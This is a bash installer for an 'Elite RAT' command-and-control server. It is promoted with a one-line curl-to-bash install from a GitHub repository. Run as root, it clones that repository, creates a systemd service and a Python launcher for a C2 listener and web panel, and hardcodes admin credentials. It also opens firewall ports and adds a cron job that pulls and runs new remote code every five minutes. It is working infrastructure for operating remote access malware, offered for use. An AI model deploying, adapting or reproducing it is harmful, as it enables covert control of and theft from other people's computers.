#!/bin/bash
#############################################################
# ELITE RAT - AUTO DEPLOYMENT & UPDATE SCRIPT
# One-line install: curl -s https://raw.githubusercontent.com/oranolio956/flipperflipper/main/deploy.sh | bash
#############################################################

set -e

# Configuration
REPO_URL="https://github.com/oranolio956/flipperflipper.git"
INSTALL_DIR="/opt/elite_rat"
SERVICE_NAME="elite_rat"
LOG_FILE="/var/log/elite_rat_deploy.log"
UPDATE_CHECK_INTERVAL=300  # Check for updates every 5 minutes

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Logging function
log() {
    echo -e "${GREEN}[+]${NC} $1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> $LOG_FILE
}

error() {
    echo -e "${RED}[!]${NC} $1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] ERROR: $1" >> $LOG_FILE
    exit 1
}

# Check if running as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        error "This script must be run as root!"
    fi
}

# Install dependencies
install_dependencies() {
    log "Installing dependencies..."
    
    apt-get update -qq
    apt-get install -y -qq \
        python3 \
        python3-pip \
        python3-venv \
        git \
        openssl \
        screen \
        tmux \
        curl \
        wget \
        net-tools \
        build-essential \
        python3-dev \
        libssl-dev \
        libffi-dev \
        > /dev/null 2>&1
    
    log "Dependencies installed"
}

# Clone or update repository
setup_repository() {
    if [ -d "$INSTALL_DIR" ]; then
        log "Updating existing installation..."
        cd $INSTALL_DIR
        
        # Stash any local changes
        git stash > /dev/null 2>&1
        
        # Pull latest changes
        git pull origin main > /dev/null 2>&1
        
        log "Repository updated"
    else
        log "Cloning repository..."
        git clone $REPO_URL $INSTALL_DIR > /dev/null 2>&1
        cd $INSTALL_DIR
        log "Repository cloned"
    fi
}

# Setup Python environment
setup_python_env() {
    log "Setting up Python environment..."
    
    cd $INSTALL_DIR
    
    # Create virtual environment if it doesn't exist
    if [ ! -d "venv" ]; then
        python3 -m venv venv
    fi
    
    # Activate virtual environment
    source venv/bin/activate
    
    # Upgrade pip
    pip install --upgrade pip > /dev/null 2>&1
    
    # Install requirements
    pip install -q \
        flask \
        flask-socketio \
        flask-cors \
        cryptography \
        pyyaml \
        pyjwt \
        pillow \
        dnspython \
        psutil \
        requests \
        python-engineio \
        python-socketio
    
    log "Python environment ready"
}

# Generate SSL certificates
generate_certificates() {
    log "Generating SSL certificates..."
    
    CERT_DIR="$INSTALL_DIR/certs"
    mkdir -p $CERT_DIR
    
    if [ ! -f "$CERT_DIR/server.crt" ]; then
        openssl req -x509 -newkey rsa:4096 -nodes \
            -out $CERT_DIR/server.crt \
            -keyout $CERT_DIR/server.key \
            -days 365 \
            -subj "/C=US/ST=State/L=City/O=Organization/CN=localhost" \
            > /dev/null 2>&1
        
        chmod 600 $CERT_DIR/server.key
        log "SSL certificates generated"
    else
        log "SSL certificates already exist"
    fi
}

# Create systemd service
create_service() {
    log "Creating systemd service..."
    
    cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
[Unit]
Description=Elite RAT C2 Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=$INSTALL_DIR
Environment="PATH=$INSTALL_DIR/venv/bin"
ExecStart=$INSTALL_DIR/venv/bin/python $INSTALL_DIR/start_server.py
Restart=always
RestartSec=10
StandardOutput=append:/var/log/${SERVICE_NAME}.log
StandardError=append:/var/log/${SERVICE_NAME}_error.log

[Install]
WantedBy=multi-user.target
EOF
    
    # Create start script
    cat > $INSTALL_DIR/start_server.py << 'EOF'
#!/usr/bin/env python3
import os
import sys
import time
import threading

# Add workspace to path
sys.path.insert(0, '/opt/elite_rat')

# Set environment variables
os.environ['STITCH_ADMIN_USER'] = 'admin'
os.environ['STITCH_ADMIN_PASSWORD'] = 'EliteC2Password123!'
os.environ['ELITE_C2_HOST'] = '0.0.0.0'
os.environ['ELITE_C2_PORT'] = '5555'
os.environ['ELITE_WEB_PORT'] = '5000'

def start_c2_server():
    """Start the C2 server"""
    try:
        from Core.c2_server import SecureC2Server
        
        server = SecureC2Server(
            host='0.0.0.0',
            port=5555,
            use_ssl=True,
            cert_file='/opt/elite_rat/certs/server.crt',
            key_file='/opt/elite_rat/certs/server.key'
        )
        
        print("[+] C2 Server starting on port 5555...")
        server.start()
    except Exception as e:
        print(f"[-] C2 Server error: {e}")

def start_web_server():
    """Start the web interface"""
    try:
        from Core.web_api import app, init_app
        
        # Initialize the app
        init_app()
        
        print("[+] Web interface starting on port 5000...")
        app.run(
            host='0.0.0.0',
            port=5000,
            ssl_context=('/opt/elite_rat/certs/server.crt', 
                        '/opt/elite_rat/certs/server.key'),
            debug=False,
            threaded=True
        )
    except Exception as e:
        print(f"[-] Web server error: {e}")

if __name__ == '__main__':
    print("=" * 60)
    print("ELITE RAT C2 SERVER")
    print("=" * 60)
    
    # Start C2 server in thread
    c2_thread = threading.Thread(target=start_c2_server, daemon=True)
    c2_thread.start()
    
    # Wait a moment for C2 to start
    time.sleep(2)
    
    # Start web server (blocking)
    start_web_server()
EOF
    
    chmod +x $INSTALL_DIR/start_server.py
    
    # Reload systemd
    systemctl daemon-reload
    
    log "Service created"
}

# Create auto-update script
create_auto_updater() {
    log "Setting up auto-updater..."
    
    cat > $INSTALL_DIR/auto_update.sh << 'EOF'
#!/bin/bash

INSTALL_DIR="/opt/elite_rat"
SERVICE_NAME="elite_rat"

cd $INSTALL_DIR

# Check for updates
git fetch origin main > /dev/null 2>&1

LOCAL=$(git rev-parse HEAD)
REMOTE=$(git rev-parse origin/main)

if [ "$LOCAL" != "$REMOTE" ]; then
    echo "[$(date)] Update available, pulling changes..."
    
    # Stop service
    systemctl stop $SERVICE_NAME
    
    # Pull updates
    git pull origin main
    
    # Update dependencies
    source venv/bin/activate
    pip install -q --upgrade -r requirements.txt 2>/dev/null || true
    
    # Restart service
    systemctl start $SERVICE_NAME
    
    echo "[$(date)] Update complete"
else
    echo "[$(date)] No updates available"
fi
EOF
    
    chmod +x $INSTALL_DIR/auto_update.sh
    
    # Add to crontab for auto-updates every 5 minutes
    (crontab -l 2>/dev/null; echo "*/5 * * * * $INSTALL_DIR/auto_update.sh >> /var/log/elite_rat_update.log 2>&1") | crontab -
    
    log "Auto-updater configured"
}

# Configure firewall
configure_firewall() {
    log "Configuring firewall..."
    
    # Check if ufw is installed
    if command -v ufw > /dev/null; then
        ufw allow 5000/tcp comment 'Elite RAT Web' > /dev/null 2>&1
        ufw allow 5555/tcp comment 'Elite RAT C2' > /dev/null 2>&1
        ufw allow 22/tcp comment 'SSH' > /dev/null 2>&1
        
        # Enable firewall if not already
        ufw --force enable > /dev/null 2>&1
        
        log "Firewall configured"
    else
        log "UFW not found, skipping firewall config"
    fi
}

# Start services
start_services() {
    log "Starting services..."
    
    systemctl enable ${SERVICE_NAME} > /dev/null 2>&1
    systemctl restart ${SERVICE_NAME}
    
    # Check if service is running
    sleep 3
    if systemctl is-active --quiet ${SERVICE_NAME}; then
        log "Service started successfully"
    else
        error "Service failed to start! Check logs: journalctl -u ${SERVICE_NAME}"
    fi
}

# Display access information
show_access_info() {
    echo ""
    echo "=========================================="
    echo -e "${GREEN}ELITE RAT DEPLOYMENT COMPLETE!${NC}"
    echo "=========================================="
    echo ""
    echo -e "${YELLOW}Access Information:${NC}"
    echo -e "Web Interface: ${GREEN}https://$(curl -s ifconfig.me):5000${NC}"
    echo -e "C2 Server: ${GREEN}$(curl -s ifconfig.me):5555${NC}"
    echo ""
    echo -e "${YELLOW}Default Credentials:${NC}"
    echo -e "Username: ${GREEN}admin${NC}"
    echo -e "Password: ${GREEN}EliteC2Password123!${NC}"
    echo ""
    echo -e "${YELLOW}Useful Commands:${NC}"
    echo -e "View logs: ${GREEN}journalctl -u ${SERVICE_NAME} -f${NC}"
    echo -e "Restart: ${GREEN}systemctl restart ${SERVICE_NAME}${NC}"
    echo -e "Status: ${GREEN}systemctl status ${SERVICE_NAME}${NC}"
    echo -e "Manual update: ${GREEN}$INSTALL_DIR/auto_update.sh${NC}"
    echo ""
    echo -e "${YELLOW}Auto-Updates:${NC} Enabled (checks every 5 minutes)"
    echo ""
    echo "=========================================="
}

# Main installation flow
main() {
    echo ""
    echo "=========================================="
    echo -e "${GREEN}ELITE RAT AUTO-DEPLOYMENT SCRIPT${NC}"
    echo "=========================================="
    echo ""
    
    check_root
    install_dependencies
    setup_repository
    setup_python_env
    generate_certificates
    create_service
    create_auto_updater
    configure_firewall
    start_services
    show_access_info
}

# Run main function
main